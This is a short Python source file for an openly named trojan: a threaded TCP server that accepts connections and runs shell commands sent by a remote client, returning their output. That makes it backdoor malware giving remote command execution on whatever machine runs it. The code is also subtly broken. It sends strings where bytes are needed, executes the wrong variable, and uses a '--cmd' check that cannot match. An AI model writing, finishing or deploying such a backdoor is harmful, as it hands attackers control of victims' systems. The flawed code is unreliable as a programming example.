import socket
import threading

from cmd import *


"""NETWORK RULES:
- always base64 encode transmission
-always end transmission with \n\r\n\r
"""
def Trecieve(client_socket):
    buffer = b''
    while '\n' not in buffer.decode():
        buffer += client_socket.recv(4096)
    buffer = buffer.decode()
    return buffer


class TrojanHorse:
    def __init__(self, server_ip='127.0.0.1', port=12345):
        """the server that runs the trojan horse"""
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def __del__(self):
        self.socket.close()
        
    def run(self):
        self.socket.bind((self.server_ip, self.port))
        self.socket.listen(5)
        while True:
            conn, ip = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(conn, ip,))
            client_thread.start()
            
    def handle(self, client_socket, client_ip):
        """threaded command, if needed runs cmd and the file session,
        handles sending the data to the client"""
        buffer = Trecieve(client_socket)
        if buffer == '--cmd':
            exec = Executor('c')
            while True:
                client_socket.send(f'{os.getcwd()}>')
                cmd = Trecieve(client_socket)
                if cmd=='exit':
                    client_socket.send('exiting cmd...\n\r\n\r')
                    break
                client_socket.send(exec(buffer).encode()+b'\n\r\n\r')
            
        
                
        

    
